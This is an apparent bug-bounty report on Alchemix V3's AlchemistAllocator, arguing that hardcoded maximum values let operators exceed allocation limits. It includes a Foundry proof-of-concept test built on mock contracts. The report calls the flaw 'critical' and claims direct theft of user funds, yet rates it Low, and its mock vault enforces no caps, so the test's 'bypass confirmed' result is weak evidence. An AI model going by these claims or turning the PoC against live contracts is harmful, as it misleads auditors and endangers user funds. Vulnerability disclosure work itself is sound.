# 58575 sc low operator limit bypass&#x20;

**Submitted on Nov 3rd 2025 at 10:12:47 UTC by @iAfrika for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #58575
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistAllocator.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

A critical vulnerability has been identified in the AlchemistV3 protocol's `AlchemistAllocator` contract that allows operators to completely bypass intended allocation limits. This vulnerability enables operators to allocate unlimited amounts of funds to strategies, potentially leading to complete protocol insolvency and direct theft of user funds.

## Vulnerability Details

oot Cause

The `AlchemistAllocator.allocate()` and `AlchemistAllocator.deallocate()` functions contain hardcoded `type(uint256).max` values instead of properly integrating with the governance-controlled `AlchemistStrategyClassifier` contract for risk-based limits.

### Affected Code

`allocate()` <https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/AlchemistAllocator.sol#L29-L44>

`deallocate()` <https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/AlchemistAllocator.sol#L51-L66>

1. **Missing Governance Integration**: Incomplete integration with `StrategyClassificationProxy`
2. **Hardcoded Maximum Values**: Using `type(uint256).max` renders limit checks completely ineffective
3. **Functional Governance System Ignored**: `AlchemistStrategyClassifier` provides proper risk-based limits but is not utilized

## Impact Details

* Operators can allocate unlimited funds to malicious or high-risk strategies
* No effective safeguards prevent complete vault drainage
* Users have no protection against operator abuse

## References

Add any relevant links to documentation or code

## Proof of Concept

## Proof of Concept

`OperatorLimitBypass.t.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {AlchemistAllocator} from "../AlchemistAllocator.sol";
import {AlchemistStrategyClassifier} from "../AlchemistStrategyClassifier.sol";

/**
 * @title SimpleOperatorLimitBypassPoC
 * @notice Simplified proof of concept demonstrating the operator limit bypass vulnerability
 * @dev This test clearly shows the core issue: operators can allocate unlimited funds
 */
contract SimpleOperatorLimitBypassPoC is Test {
    AlchemistAllocator public allocator;
    AlchemistStrategyClassifier public classifier;
    
    address public admin;
    address public operator;
    
    SimpleVault public vault;
    SimpleStrategy public strategy;
    
    function setUp() public {
        admin = makeAddr("admin");
        operator = makeAddr("operator");
        
        // Deploy simple mock contracts
        vault = new SimpleVault();
        strategy = new SimpleStrategy();
        
        // Deploy the allocator with operator
        vm.prank(admin);
        allocator = new AlchemistAllocator(address(vault), admin, operator);
        
        // Deploy strategy classifier with proper limits
        vm.prank(admin);
        classifier = new AlchemistStrategyClassifier(admin);
        
        // Set a reasonable limit for our test strategy
        vm.prank(admin);
        classifier.setRiskClass(1, 5_000_000e18, 1_000_000e18); // 5M global, 1M individual
        
        // Set vault caps that should limit operator allocations
        vault.setAbsoluteCap(bytes32(uint256(1)), 2_000_000e18); // 2M absolute
        vault.setRelativeCap(bytes32(uint256(1)), 1_500_000e18); // 1.5M relative
    }
    
    /**
     * @notice Core vulnerability test: Operator can bypass intended limits
     */
    function test_OperatorCanBypassLimits() public {
        uint256 intendedLimit = 1_000_000e18;    // 1M tokens (from classifier)
        uint256 excessiveAmount = 10_000_000e18; // 10M tokens (10x the limit!)
        
        console.log("=== OPERATOR LIMIT BYPASS VULNERABILITY ===");
        console.log("Intended operator limit:      ", intendedLimit);
        console.log("Operator attempting to allocate:", excessiveAmount);
        console.log("Ratio (should be ~1.0):       ", excessiveAmount / intendedLimit, "x over limit");
        
        // Show that the governance system has proper limits set
        uint256 classifierLimit = classifier.getIndividualCap(1);
        console.log("Classifier individual cap:    ", classifierLimit);
        console.log("Vault absolute cap:           ", vault.absoluteCap(bytes32(uint256(1))));
        console.log("Vault relative cap:           ", vault.relativeCap(bytes32(uint256(1))));
        
        // Operator should be restricted, but isn't
        vm.prank(operator);
        allocator.allocate(address(strategy), excessiveAmount);
        
        // Verify the excessive allocation succeeded
        uint256 actualAllocation = vault.lastAllocationAmount();
        console.log("ACTUAL ALLOCATION MADE:       ", actualAllocation);
        
        // This should fail but doesn't - proving the vulnerability
        assertEq(actualAllocation, excessiveAmount, "Operator bypass successful");
        
        console.log("");
        console.log("VULNERABILITY CONFIRMED:");
        console.log("- Operator allocated 10x the intended limit");
        console.log("- No enforcement of governance-defined caps");
        console.log("- type(uint256).max used instead of StrategyClassificationProxy");
    }
    
    /**
     * @notice Show the broken logic in the allocator
     */
    function test_BrokenLogicExplanation() public view {
        console.log("=== BROKEN LOGIC ANALYSIS ===");
        
        // These are the values the allocator would read
        uint256 absoluteCap = vault.absoluteCap(bytes32(uint256(1)));
        uint256 relativeCap = vault.relativeCap(bytes32(uint256(1)));
        
        console.log("Step 1 - Read vault caps:");
        console.log("  absoluteCap:  ", absoluteCap);
        console.log("  relativeCap:  ", relativeCap);
        
        // This mirrors the broken logic in AlchemistAllocator.allocate()
        uint256 daoTarget = type(uint256).max; // FIXME: should come from StrategyClassificationProxy
        uint256 adjusted = absoluteCap > relativeCap ? absoluteCap : relativeCap;
        
        console.log("Step 2 - Broken calculation:");
        console.log("  daoTarget (hardcoded max): ", daoTarget);
        console.log("  adjusted (max of caps):    ", adjusted);
        
        // For operators: adjusted = adjusted > daoTarget ? adjusted : daoTarget;
        uint256 operatorLimit = adjusted > daoTarget ? adjusted : daoTarget;
        
        console.log("Step 3 - Result for operators:");
        console.log("  operatorLimit:     ", operatorLimit);
        console.log("  Is unlimited?      ", operatorLimit == type(uint256).max ? "YES" : "NO");
        
        console.log("Step 4 - Missing enforcement:");
        console.log("  No require() statement checks allocation against operatorLimit");
        console.log("  Calculation is done but never used for validation");
        
        assertTrue(operatorLimit == type(uint256).max, "Operator limit is unlimited");
    }
}

/**
 * @notice Minimal vault mock for testing
 */
contract SimpleVault {
    mapping(bytes32 => uint256) private _absoluteCaps;
    mapping(bytes32 => uint256) private _relativeCaps;
    
    uint256 public lastAllocationAmount;
    
    function setAbsoluteCap(bytes32 id, uint256 cap) external {
        _absoluteCaps[id] = cap;
    }
    
    function setRelativeCap(bytes32 id, uint256 cap) external {
        _relativeCaps[id] = cap;
    }
    
    function absoluteCap(bytes32 id) external view returns (uint256) {
        return _absoluteCaps[id];
    }
    
    function relativeCap(bytes32 id) external view returns (uint256) {
        return _relativeCaps[id];
    }
    
    function allocation(bytes32) external pure returns (uint256) {
        return 0; // Mock: no existing allocation
    }
    
    function allocate(address, bytes memory, uint256 amount) external {
        lastAllocationAmount = amount;
    }
    
    function asset() external pure returns (address) { 
        return address(0x1); // Return non-zero to pass constructor check
    }
}

/**
 * @notice Minimal strategy mock for testing
 */
contract SimpleStrategy {
    function adapterId() external pure returns (bytes32) {
        return bytes32(uint256(1));
    }
    
    function getIdData() external pure returns (bytes memory) {
        return abi.encode(uint256(1));
    }
}
```

## Mitigation

Replace Hard coded limits with governance integration
